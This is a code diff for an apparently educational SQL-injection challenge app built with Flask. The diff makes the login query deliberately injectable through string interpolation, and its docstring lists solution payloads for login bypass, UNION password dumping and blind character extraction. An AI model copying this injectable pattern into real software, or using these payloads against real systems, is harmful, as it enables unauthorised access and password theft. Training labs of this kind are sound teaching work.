@@ -10,26 +10,32 @@ from flask import (
     request,
     flash
 )
-from sqli_platform import app, app_log, db
-from sqli_platform.utils.challenge import get_flag, get_config, format_query
+from sqli_platform import app, clog, db
+from sqli_platform.utils.challenge import (
+    get_flag,
+    get_config,
+    format_query
+)
 
 """
-The login function has been patched.
-The notes function has been patched.
+Flag1 - Login as admin
+Bypass login:
+' OR 1=1--
 
-Create user:
-username: admin' -- -
-password: whatever
+Flag2 - From password dump?
+Dump passwords:
+' UNION SELECT 1,group_concat(password) from users--
 
-Change password, enter old password <whatever> and set something new. 
-Login with:
-username: admin
-password: <password set in previous step>
+New challenge: Make it blind so the user must build a script to get the password
+' UNION SELECT 1,(SELECT hex(substr(password,3,1)) from users limit 1)--
+
+
+SELECT id, username FROM users WHERE username = '-1747' OR SUBSTR((SELECT COALESCE(CAST(sql AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE tbl_name=CAST(X'7573657273' AS TEXT) LIMIT 1),113,1)>CAST(X'01' AS TEXT)--
+
 """
 
 _bp = "challenge3"
-challenge3 = Blueprint(_bp, __name__,
-                       template_folder="templates", url_prefix=f"/{_bp}")
+challenge3 = Blueprint(_bp , __name__, template_folder='templates', url_prefix=f"/{_bp}")
 _templ = "challenges/challenge1"
 _query = []
 
@@ -41,10 +47,11 @@ def sessions():
     global _query
     d = dict(
         cname=_bp,
-        csession=session.get(f"{_bp}_user_id", None),
+        csession = session.get(f"{_bp}_user_id", None),
         csession_name=session.get(f"{_bp}_username", None),
         ctitle=get_config(f"{_bp}", "title"),
-        query=format_query(_query)
+        query=format_query(_query),
+        slides="challenge1/slides/slides.html"
     )
     _query = []
     return d
@@ -58,7 +65,6 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
-
 @challenge3.route("/")
 @challenge3.route("/login", methods=["GET", "POST"])
 def login():
@@ -70,21 +76,24 @@ def login():
 
         if not (username and password):
             flash("Username or Password cannot be empty.", "warning")
-            return redirect(url_for("challenge3.login"))
-
-        query = "SELECT id, username FROM users WHERE username = ? AND password = ?"
-        params = [username, password]
-        _query.append((query, params))
-
-        user = db.sql_query(_bp, query, params, one=True)
-
+            return redirect(url_for(f"{_bp}.login"))
+        
+        query = f"SELECT id, username FROM users WHERE username = '{username}' AND password = '{password}'"
+        _query.append(query)
+        user = db.sql_query(_bp, query, one=True)
+        
         if user:
-            session[f"{_bp}_user_id"] = user["id"]
-            session[f"{_bp}_username"] = user["username"]
-            return redirect(url_for("challenge3.home"))
+            # Get clean data, decoding the cookie is not a part of this challenge
+            clean = f"SELECT id, username FROM users WHERE username = ? AND password = ?"
+            clean_data = db.sql_query(_bp, clean, [username, password], one=True)
+
+            session[f"{_bp}_user_id"] = clean_data["id"] if clean_data else 1
+            session[f"{_bp}_username"] = clean_data["username"] if clean_data else "Unkown"
+            clog.debug(f"{_bp} login: Session: {session[f'{_bp}_user_id']}")
+            return redirect(url_for(f"{_bp}.home"))
         else:
             flash("Invalid username or password.", "danger")
-    return render_template(f"{_templ}/login.html")
+    return render_template(f"{_templ}/login.html", slide_num=0)
 
 
 @challenge3.route("/signup", methods=["GET", "POST"])
@@ -116,69 +125,20 @@ def signup():
 @challenge3.route("/home")
 @login_required
 def home():
-    sess = session.get(f"{_bp}_user_id", None)
-    f = ""
-    if sess == 1:
-        f = get_flag(_bp)
-    return render_template(f"{_bp}/index.html", flag=f)
+    return render_template(f"{_bp}/index.html")
 
 
 @challenge3.route("/notes", methods=["GET", "POST"])
 @login_required
 def notes():
-    global _query
-
-    query = "SELECT username FROM users WHERE id=?"
-    params = [session[f"{_bp}_user_id"]]
-    #_query.append((query, params))
-    user = db.sql_query(_bp, query, params, one=True)
-
-    if request.method == "POST":
-        title = request.form["title"]
-        note = request.form["note"]
-
-        query = "INSERT INTO notes (username, title, note) VALUES (?, ?, ?)"
-        params = [user["username"], title, note]
-        _query.append((query, params))
-
-        db.sql_insert(_bp, query, params)
-        return redirect(url_for(f"{_bp}.notes"))
-
-    query = f"SELECT title, note FROM notes WHERE username = ?"
-    params = [user['username']]
-    _query.append((query, params))
-    notes = db.sql_query(_bp, query, params)
-    return render_template(f"{_templ}/notes.html", notes=notes, user=user["username"])
+    flash("Not Implemented ", "warning")
+    return render_template(f"{_templ}/notes.html")
 
 
 @challenge3.route("/changepwd", methods=["GET", "POST"])
 @login_required
 def changepwd():
-    global _query
-
-    if request.method == "POST":
-        current_pwd = request.form["current-password"]
-        new_pwd = request.form["password"]
-        new_pwd2 = request.form["password2"]
-
-        if not (new_pwd == new_pwd2):
-            flash("Passwords doesn't match.")
-            return redirect(url_for(f"{_bp}.changepwd"))
-
-        query = "SELECT username, password FROM users WHERE id = ?"
-        params = [session[f"{_bp}_user_id"]]
-        _query.append((query, params))
-        user = db.sql_query(_bp, query, params, one=True)
-
-        if not (current_pwd == user["password"]):
-            flash("Wrong password supplied.", "danger")
-            return redirect(url_for(f"{_bp}.changepwd"))
-
-        query = f"UPDATE users SET password = ? WHERE username = '{user['username']}'"
-        _query.append(query)
-        db.sql_insert(_bp, query, [new_pwd])
-        flash("Password changed", "info")
-        return redirect(url_for(f"{_bp}.changepwd"))
+    flash("Not Implemented ", "warning")
     return render_template(f"{_templ}/updatepwd.html")
 
 
